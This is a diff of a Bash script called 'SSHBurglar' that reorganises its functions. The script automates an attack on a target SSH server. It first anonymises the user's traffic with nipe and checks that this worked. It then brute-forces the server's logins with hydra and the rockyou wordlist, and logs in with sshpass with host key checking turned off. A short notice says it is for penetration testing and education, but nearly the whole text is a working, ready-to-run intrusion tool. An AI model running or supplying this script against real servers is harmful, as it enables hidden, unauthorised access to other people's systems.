@@ -5,8 +5,9 @@
 #########################
 
 # INSTALL(): automatically installs relevant applications on user host and creates relevant directories
+# CONSOLE(): collects user input for the target IP address to breach
 # ANON(): executes nipe anonymiser and conducts an anonymity check
-# SSHCRACK(): collects user input for VPS address, executes a hydra brute-force attack and accesses the vps
+# SSHBREACH(): collects user input for VPS address, executes a hydra brute-force attack and accesses the vps
 
 #####################
 ### INSTALL FUNCTION
@@ -19,7 +20,7 @@ function INSTALL()
 	### START
 	# let the user know that SSHBurglar is starting
 	echo " "
-	echo "[*] SSHBurglar is starting..."
+	echo "[*] EXECUTION OF INSTALL MODULE:"
 	echo " "
 	echo "[*] Installing and updating applications on your local computer..."
 	echo " "
@@ -38,6 +39,19 @@ function INSTALL()
 	mkdir SSHBurglar
 	cd ~/SSHBurglar
 	echo "[+] Directory created: ~/SSHBurglar"
+	echo " "
+	
+		
+	### WORDLIST CONFIGURATION
+	echo "[*] Configuring Wordlists..."
+	echo " "
+	cd /usr/share/wordlists
+	sudo gunzip rockyou.txt.gz
+	sudo cp rockyou.txt ~/SSHBurglar/wordlist.txt
+	cd ~/SSHBurglar
+	sudo sed -i '1i kali' wordlist.txt
+	WordList=~/SSHBurglar/wordlist.txt
+	echo "[+] Wordlist created: ~/SSHBurglar/wordlist.txt"
 	echo " "
 	
   	### FIGLET INSTALLATION
@@ -68,51 +82,18 @@ function INSTALL()
 	echo "	"
 }
 
-### EXECUTION
-INSTALL
-
-#############
-### SSHCRACK
-#############
+###############
+### SSH_BREACH
+###############
 
 ### DEFINITION
-function SSHCRACK()
+function SSHBREACH()
 {
-	### START
-	# display figlet for aesthetics, with short description of program
-	figlet -c -f ~/SSHBurglar/figrc/cybermedium.flf -t "SSHBurglar"
-	echo " "
-	echo "[*] This program is for testing the basic network security of a VPS. Please use for penetration testing and education purposes only."
-	echo " "
-	echo "[!] Press Ctrl-C to exit."
-	echo " "
-	
-	### VPS ADDRESS INPUT
-	read -p "[!] Enter VPS IP Address: " vpsip
-	cd ~/SSHBurglar
-	mkdir $vpsip
-	cd ~/SSHBurglar/$vpsip
-	echo " "
-	echo "[+] Directory created: ~/SSHBurglar/$vpsip"
-	echo " "
-	
-	### WORDLIST CONFIGURATION
-	echo "[*] Configuring Wordlists..."
-	echo " "
-	cd /usr/share/wordlists
-	sudo gunzip rockyou.txt.gz
-	sudo cp rockyou.txt ~/SSHBurglar/$vpsip/wordlist.txt
-	cd ~/SSHBurglar/$vpsip
-	sudo sed -i '1i kali' wordlist.txt
-	WordList=~/SSHBurglar/$vpsip/wordlist.txt
-	echo "[+] Wordlist created: ~/SSHBurglar/$vpsip/wordlist.txt"
-	echo " "
-	
 	### BRUTE-FORCE ATTACK
-	echo "[*] Executing Hydra Brute-Force Attack via SSH protocol..."  
+	echo " "
+	echo "[*] EXECUTION OF SSH_BREACH MODULE:"
 	echo " "
 	sudo hydra -f -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
-	# if attack succeeds, select cracked user and call the SCP function
 	crackstatus=$(cat crackedusers.txt | grep host: | awk '{print $2}')
 	
 	### SUCCESSFUL ATTACK
@@ -132,7 +113,7 @@ function SSHCRACK()
 		echo " "
 		echo "[*] Connecting to $vpsip now..."
 		
-		### ACCESS
+		### ANONYMOUS ACCESS
 		sshpass -p "$vpspass" ssh -o StrictHostKeyChecking=no "$vpsuser"@"$vpsip" 2> /dev/null
 	
 	### UNSUCCESSFUL ATTACK
@@ -152,6 +133,8 @@ function ANON()
 {
 	### START
 	# let the user know anonymity check is starting
+	echo " "
+	echo "[*] EXECUTION OF SSH_BREACH MODULE:"
 	echo " "
 	echo "[*] Conducting Anonymity Check..."
 	echo " "
@@ -175,8 +158,8 @@ function ANON()
 		echo " "
 		echo "[+] ANONYMITY CHECK: You are currently anonymous."
 		echo " "
-		# after anonymity check, call the SSHCRACK function
-		SSHCRACK
+		# after anonymity check, call the SSHBREACH function
+		SSHBREACH
 	
 	### UNSUCCESSFUL ANONYMISATION
 	else
@@ -191,5 +174,66 @@ function ANON()
 	fi	
 }
 
-# EXECUTION
-ANON
+############
+### CONSOLE
+############
+
+function CONSOLE()
+{
+	### START
+	### INSTALLATION CHECK
+	# check to see if installations and configuration have already been done
+	echo " "
+	read -p "[!] INSTALLATION CHECK:
+	
+	[*] Enter 'y' key to install all relevant applications and configurations
+	[*] Enter 'n' key to skip installation (if you have installed previously)
+	
+	[!] Enter Option: " answer
+	
+	# process options through 'if' conditional flow
+	# if already installed, head to directory directly
+	if [ $answer == "n" ] 
+	then
+		cd ~/SSHBurglar
+		continue 2>/dev/null 
+	# if not,call the INSTALL function
+	else
+		if [ $answer == "y" ] 
+		then
+			echo " "
+			INSTALL
+			continue 2>/dev/null 
+		fi
+	fi
+	
+	### CONSOLE DISPLAY
+	# display figlet for aesthetics, with short description of program
+	echo " "
+	figlet -c -f ~/SSHBurglar/figrc/cybermedium.flf -t "SSHBURGLAR"
+	# description of functions
+	echo " "
+	echo "[*] IMPORTANT NOTICE:"
+	echo "This program is for  testing the basic security of an SSH Server. Please use for penetration testing and education purposes only."
+	echo " "
+	echo "[*] RAPID TESTING CONFIGURATION:"
+	echo "For quick testing, configure the target host to have the user and password as 'kali'."
+	echo " "
+	echo "[!] EXIT:"
+	echo "Press Ctrl-C to exit."
+	echo " "
+	
+	### VPS ADDRESS INPUT
+	echo "[!] START OF SESSION:"
+	echo " "
+	read -p "[!] Enter VPS IP Address: " vpsip
+	cd ~/SSHBurglar
+	mkdir $vpsip
+	cd ~/SSHBurglar/$vpsip
+	echo " "
+	echo "[+] Directory created: ~/SSHBurglar/$vpsip"
+	echo " "
+	
+	### CORE EXECUTION
+	ANON
+}
